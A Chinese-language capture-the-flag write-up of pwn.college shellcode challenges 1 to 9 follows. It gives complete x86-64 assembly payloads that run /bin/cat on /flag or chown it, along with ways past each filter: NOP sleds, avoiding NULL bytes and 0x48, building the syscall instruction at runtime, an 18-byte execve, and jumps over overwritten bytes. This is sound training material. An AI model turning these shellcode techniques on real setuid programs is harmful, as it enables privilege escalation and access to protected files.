---
title: Pwn College Shell Code
---

Shellcode challenges in pwn.college.

## 准备工作

首先，我不希望使用类似于 `pwntool` 这类完整的 CTF 框架，这会让我们失去对细节的理解。因此，我们将使用最基础的 `as` 作为我们的汇编器。
并且利用 `objcopy` 等来生成原生的 shellcode 进行注入。

### 编译脚本

```bash
#!/bin/bash
as --64 -o shell shell.s                        # 指示汇编器生成 64 位的代码。
objcopy -O binary -j .text shell shell.bin      # 汇编器生成的文件会包含不必要的元信息，我们使用 objcopy 将 .text 段提取出来。
objdump  -b binary shell.bin -m i386:x86-64 -D  # 输出我们的 shellcode 便于调试。
```

## Challenge 1 Plain Shellcode

这个挑战是最基础的 shellcode，程序直接执行我们注入的 shellcode。由于使用了 ASLR 保护，栈地址是完全随机的，所以我们需要确保我们的 shellcode 是位置无关的。

<details markdown="1">
<summary>shell.s (剧透警告)</summary>
```nasm
.section .text
.global _start
_start:
	leaq cmd(%rip), %rdi
	movq %rdi, argv1(%rip)
	leaq arg2(%rip), %rsi
	movq %rsi, argv2(%rip)
	leaq argv1(%rip), %rsi
	movq $0x3b, %rax
	movq $0x0, %rdx
	syscall

cmd: .string "/bin/cat"
argv1:  .long 0
	    .long 0
argv2:  .long 0
	    .long 0
	    .long 0
	    .long 0
arg2: .string "/flag"
```

</details>

接下来我们介绍几个重点部分。

### `lea` 指令
`lea` 全称为 Load Effective Address，其作用是将一个地址加载到一个寄存器中，不过不需要纠结，只要记住它的格式。与 `mov` 指令不同，`lea` 指令不会将地址中的内容加载到寄存器中，而是将地址本身加载到寄存器中。不过不需要纠结这些，只需要记住 `lea` 指令所代表的算术运算即可。

```assembly
lea o(r1,r2,m), rd
```

最后 `rd = o + r1 + r2 * m`，不管这些值代表什么，也不管最后的结果是否是一个合法的地址，`lea` 指令都会将这个结果加载到 `rd` 中。其中，`m` 代表单位位移量，只能取 1, 2, 4, 8 这几个值，分别代表 1, 2, 4, 8 字节的大小。`r1` 代表基址寄存器，`r2` 代表索引寄存器，`o` 代表偏移量。

而 `mov o(r1,r2,m), rd` 则是将 `o + r1 + r2 * m` 这个地址中的内容加载到 `rd` 中，也就是 `rd = *(o + r1 + r2 * m)`，如果最终结果不是一个合法地址，则会段错误。

### 位置无关代码
一般而言，位置无关代码是通过 pc 相对寻址实现的，也就是说我们的代码不依赖于绝对地址，而是通过目标地址与 pc 之间的偏移量来计算目标地址。而汇编器一般具有对于这类
指令的语法糖。例如 `leaq cmd(%rip), %rdi` 所代表的并不是将 `$cmd + %rip` 这个地址赋值给 `%rdi`，而是将 `$cmd` 这个地址以 pc 相对寻址的方式赋值给 `%rdi`。

### SetUID
这部分详见 [Linux 中各种各样的 UID](../uid)。

### `argv`
`argv` 是一个指向字符串指针的指针，我们需要将其设置为一个指向字符串指针的数组。在这里，我们将 `argv` 设置为一个指向字符串指针的数组，其中第一个指针指向 `cmd`，第二个指针指向 `arg2="/flag"`，第三个指针指向 `NULL` 代表终止符。

## Challenge 2 Shellcode with NOP Sled

这次程序会将 shellcode 的前 800 个字节删除，我们只需要在 shellcode 前面加上一些 NOP 指令即可。

```assembly
.fill 800, 1, 0x90
```

`.fill` 是一条伪指令，用于填充数据，其格式为 `.fill n, size, value`，表示填充 `n` 个 `size` 大小的 `value`。

## Challenge 3 Shellcode with NULL-byte Filter

这一次我们将不能使用 NULL 字节，因为程序会将 shellcode 中的 NULL 字节删除。我们将使用一个有意思的技巧，即在 shellcode 中再发起一个系统调用，这样我们可以通过这个系统调用来继续读取新的 shellcode。也就是我们将执行一个 `read(stdin, %rip, 0x1ff)` 的系统调用，这样我们就可以继续读取新的 shellcode。

获取 `%rip` 的值在没有 NULL 字节的情况下是非常困难的，幸运的是，这一次 Victim 程序会将我们的 shellcode 加载到一个固定的地址，我们可以直接在 shellcode 中硬编码常量。

<details markdown="1">
<summary>shell.s (剧透警告)</summary>
```nasm
.section .text
.global _start
_start:
	xor %rax, %rax
	xor %rdi, %rdi
	xor %rsi, %rsi
	xor %rdx, %rdx
	mov $0x15e0, %si
        shl $4, %rsi	
	add $0xd, %rsi
	shl $12, %rsi
	mov $0x1ff, %dx
	syscall
	.fill 0x1000,1,0x90

	leaq cmd(%rip), %rdi
	movq %rdi, argv1(%rip)
	leaq arg2(%rip), %rsi
	movq %rsi, argv2(%rip)
	leaq argv1(%rip), %rsi
	movq $0x3b, %rax
	movq $0x0, %rdx
	syscall

cmd: .string "/bin/cat"
argv1:  .long 0
	        .long 0
argv2:  .long 0
	        .long 0
	        .long 0
	        .long 0
arg2: .string "/flag"
```
</details>

同时通过一系列技巧来避免我们的 shellcode 中出现 NULL 字节。

- 使用 `xor` 指令来清空寄存器。
- 使用 `shl` 和 `add` 指令组合计算。
- 使用 16 位与 32 位指令而不是 64 位指令来避免 NULL 字节。 

## Challenge 4 Shellcode w.o 'H'
这个题目会提前过滤所有的 `H` 字符，也就是 `0x48`。下面是关键点。

- 使用 `push %reg` `pop %reg` 来设置寄存器。
- 使用 `read(stdin, %rip, length)` 来覆盖原有的 shellcode。

<details markdown="1">
<summary>shell.s (剧透警告)</summary>
```nasm
.section .text
.global _start
_start:
	push $0	
	pop %rax
	push $0	
	pop %rdi
	push $0	
	pop %rsi
	push $0	
	pop %rdx
	push $0x2520a000
	pop %rsi
	mov $0x1ff, %dx
	syscall
	.fill 0x1000,1,0x90

	leaq cmd(%rip), %rdi
	movq %rdi, argv1(%rip)
	leaq arg2(%rip), %rsi
	movq %rsi, argv2(%rip)
	leaq argv1(%rip), %rsi
	movq $0x3b, %rax
	movq $0x0, %rdx
	syscall

cmd: .string "/bin/cat"
argv1:  .long 0
	        .long 0
argv2:  .long 0
	        .long 0
	        .long 0
	        .long 0
arg2: .string "/flag"
```
</details>

## Challenge 5 & 6 Shellcode w.o `syscall`

这个题目会过滤 `syscall (0x0f 0x05)` 指令，直接在内存上现场构造即可。

<details markdown="1">
<summary>shell.s (剧透警告)</summary>
```nasm
.section .text
.global _start
_start:
	.fill 0x1000, 1, 0x90
	movb $0xf, target(%rip)
	movb $0x5, target+1(%rip)
	leaq cmd(%rip), %rdi
	movq %rdi, argv1(%rip)
	leaq arg2(%rip), %rsi
	movq %rsi, argv2(%rip)
	leaq argv1(%rip), %rsi
	movq $0x3b, %rax
	movq $0x0, %rdx
target: .long 0
	
	

cmd: .string "/bin/cat"
argv1:  .long 0
	        .long 0
argv2:  .long 0
	        .long 0
	        .long 0
	        .long 0
arg2: .string "/flag"
```

</details>


## Challenge 7 Shellcode with closed file descriptor

这个题目将所有的文件描述符都关闭了，因此不能通过 `cat` 之类的进行读取 flag。
我使用了 `chown` 直接改变 `/flag` 的权限。

<details markdown="1">
<summary>shell.s (剧透警告)</summary>
```nasm
.section .text
.global _start
_start:
	movb $0xf, target(%rip)
	movb $0x5, target+1(%rip)
	leaq cmd(%rip), %rdi
	movq %rdi, argv1(%rip)

	leaq arg2(%rip), %rsi
	movq %rsi, argv2(%rip)

	leaq arg3(%rip), %rsi
	movq %rsi, argv3(%rip)

	leaq argv1(%rip), %rsi
	movq $0x3b, %rax
	movq $0x0, %rdx
target: .long 0
	
	

cmd: .string "/bin/chown"
argv1:  .long 0
	.long 0
argv2:  .long 0
	.long 0
argv3:  .long 0
	.long 0
	        .long 0
	        .long 0
arg2: .string "hacker"
arg3: .string "/flag"

```
</details>

## Challenge 8 18 Byte Shellcode

这个是一个很有趣的题目，只允许 18 byte，我并没有分析在调用点进入时，有哪些寄存器不需要设置（可以复用）。
而是继续坚持使用 `execve("/bin/cat", NULL, NULL)`，但很显然 `/bin/cat` 会导致我的 Shellcode 超过上限。

因此，我用 C 语言编写了一个程序，命名为 `f` 放在当前的工作目录下，然后再利用 `execve` 调用该文件 `f` 来读取 flag。


<details markdown="1">
<summary>shell.s (剧透警告)</summary>
```nasm
.section .text
.global _start
_start:
	xor %esi, %esi
	xor %edx, %edx
	lea flag(%rip), %rdi
	push $0x3B
	pop %rax
	syscall
flag: .string "f"
```
</details>

## Challenge 9 Modified Shellcode

每隔 10 个 Byte，Shellcode 就会被改写，处理方式非常简单，用 `jmp` 把被改写部分跳过。

<details markdown="1">
<summary>shell.s (剧透警告)</summary>
```nasm
.section .text
.global _start
_start:
	leaq cmd(%rip), %rdi
        jmp 0f
        .fill 11, 1, 0x90
0:      leaq arg2(%rip), %r10
        jmp 1f
        .fill 11, 1, 0x90
1:      movq %r10, (%rsp)
        jmp 2f
        .fill 14, 1, 0x90
2:      movq %r10, -8(%rsp)
        jmp 3f
        .fill 13, 1, 0x90
3:      movq $0x0, %rdx
        jmp 4f
        .fill 11, 1, 0x90
4:      leaq -8(%rsp), %rsi
        jmp 5f
        .fill 13, 1, 0x90
5:      movq $0x3b, %rax
        jmp 6f
        .fill 11, 1, 0x90
6:      movq %rdx, 8(%rsp)
        syscall
.fill 13, 1, 0x90
cmd: .string "/bin/cat"
.fill 11, 1, 0x90
arg2: .string "/flag"
```
</details>
